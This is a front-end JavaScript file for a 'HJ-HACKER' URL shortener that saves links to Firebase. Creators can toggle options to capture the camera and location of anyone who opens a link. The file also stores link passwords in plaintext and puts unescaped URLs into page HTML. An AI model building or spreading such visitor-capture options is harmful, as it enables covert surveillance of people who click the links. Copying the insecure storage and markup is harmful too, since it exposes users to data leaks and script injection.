// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Test database connection on load
window.addEventListener('load', async () => {
    console.log('🔍 Testing Firebase connection...');
    try {
        const testRef = database.ref('test');
        await testRef.set({ timestamp: Date.now() });
        console.log('✅ Firebase connected successfully!');
        showToast('Connected', 'Database is ready', 'success');
    } catch (error) {
        console.error('❌ Firebase connection failed:', error);
        showToast('Error', 'Database connection failed. Check rules.', 'error');
    }
});

// Toast function
function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = document.getElementById('socialTitle')?.value || null;
    const socialUrl = document.getElementById('socialUrl')?.value || null;
    const socialDesc = document.getElementById('socialDesc')?.value || null;
    const socialButton = document.getElementById('socialButton')?.value || null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    const expiryDate = document.getElementById('expiresAt')?.value || null;
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = localStorage.getItem('hj_device_id') || Math.random().toString(36).substring(2, 15);
        localStorage.setItem('hj_device_id', deviceId);
        const createdAt = new Date().toISOString();
        
        const linkData = {
            domain: domain,
            long_url: urlToShorten,
            password: password,
            social_gate_title: socialTitle,
            social_gate_url: socialUrl,
            social_gate_icon: socialIcon,
            social_gate_description: socialDesc,
            social_gate_button_text: socialButton,
            animation_type: animation,
            capture_camera: cameraCapture,
            capture_location: locationCapture,
            expires_at: expiryDate,
            device_id: deviceId,
            clicks: 0,
            created_at: createdAt
        };
        
        // Remove null values
        Object.keys(linkData).forEach(key => linkData[key] === null && delete linkData[key]);
        
        console.log('📝 Saving to Firebase:', { shortCode, linkData });
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${domain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        
        // Save to recent
        const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
        recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: createdAt });
        localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
        
        // QR Code
        if (typeof QRCode !== 'undefined') {
            document.getElementById('qrCode').innerHTML = '';
            new QRCode(document.getElementById('qrCode'), {
                text: shortUrl,
                width: 128,
                height: 128,
                colorDark: "#00ff41",
                colorLight: "#000000"
            });
        }
        
        document.getElementById('result').classList.remove('hidden');
        showToast('Success', 'Link created successfully!', 'success');
        
        // Clear form
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection')?.classList.add('hidden');
        document.getElementById('socialSection')?.classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        if (document.getElementById('socialTitle')) document.getElementById('socialTitle').value = '';
        if (document.getElementById('socialUrl')) document.getElementById('socialUrl').value = '';
        
        // Refresh recent list
        loadRecentLinks();
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        loading?.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        loading?.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// Load recent links
async function loadRecentLinks() {
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    const container = document.getElementById('recentList');
    if (!container) return;
    
    if (recent.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-inbox"></i><p>No recent links</p></div>';
        return;
    }
    
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code"><i class="fas fa-link"></i> /${link.code}</div>
                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
                <div style="font-size: 0.6rem; color: #444;">${new Date(link.date).toLocaleString()}</div>
            </div>
            <div class="recent-actions">
                <button onclick="copyToClipboard('${link.shortUrl}')" class="btn-icon"><i class="fas fa-copy"></i></button>
            </div>
        </div>
    `).join('');
}

// Copy function
window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied to clipboard', 'success');
};

// Toggle handlers
const passwordToggle = document.getElementById('passwordToggle');
if (passwordToggle) {
    passwordToggle.addEventListener('change', (e) => {
        const section = document.getElementById('passwordSection');
        if (section) section.classList.toggle('hidden');
    });
}

const socialToggle = document.getElementById('socialToggle');
if (socialToggle) {
    socialToggle.addEventListener('change', (e) => {
        const section = document.getElementById('socialSection');
        if (section) section.classList.toggle('hidden');
    });
}

// Tab switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
        const activeTab = document.getElementById(`${tab}Tab`);
        if (activeTab) activeTab.classList.remove('hidden');
        if (tab === 'recent') await loadRecentLinks();
    });
});

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        const socialIconInput = document.getElementById('socialIcon');
        if (socialIconInput) socialIconInput.value = icon.dataset.icon;
    });
});

// Advanced toggle
const advancedToggle = document.getElementById('advancedToggle');
if (advancedToggle) {
    advancedToggle.addEventListener('click', () => {
        const content = document.getElementById('advancedContent');
        const icon = document.querySelector('#advancedToggle .fa-chevron-down');
        if (content) content.classList.toggle('hidden');
        if (icon) icon.style.transform = content?.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
    });
}

// Event listeners
const shortenBtn = document.getElementById('shortenBtn');
if (shortenBtn) shortenBtn.addEventListener('click', shortenUrl);

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const link = document.getElementById('shortLink')?.textContent;
        if (link) copyToClipboard(link);
    });
}

// Initialize
loadRecentLinks();

// Modal functions for redirect (if needed)
window.showPasswordModal = function(linkData) {
    return new Promise((resolve) => {
        const modal = document.getElementById('passwordModal');
        if (modal) {
            modal.classList.remove('hidden');
            const unlockBtn = document.getElementById('modalUnlock');
            const cancelBtn = document.getElementById('modalCancel');
            const passwordInput = document.getElementById('modalPassword');
            
            const onUnlock = () => {
                const password = passwordInput?.value;
                modal.classList.add('hidden');
                resolve(password);
                unlockBtn?.removeEventListener('click', onUnlock);
                cancelBtn?.removeEventListener('click', onCancel);
            };
            
            const onCancel = () => {
                modal.classList.add('hidden');
                resolve(null);
                unlockBtn?.removeEventListener('click', onUnlock);
                cancelBtn?.removeEventListener('click', onCancel);
            };
            
            unlockBtn?.addEventListener('click', onUnlock);
            cancelBtn?.addEventListener('click', onCancel);
        } else {
            resolve(null);
        }
    });
};

console.log('🔥 HJ-HACKER Script Loaded!');
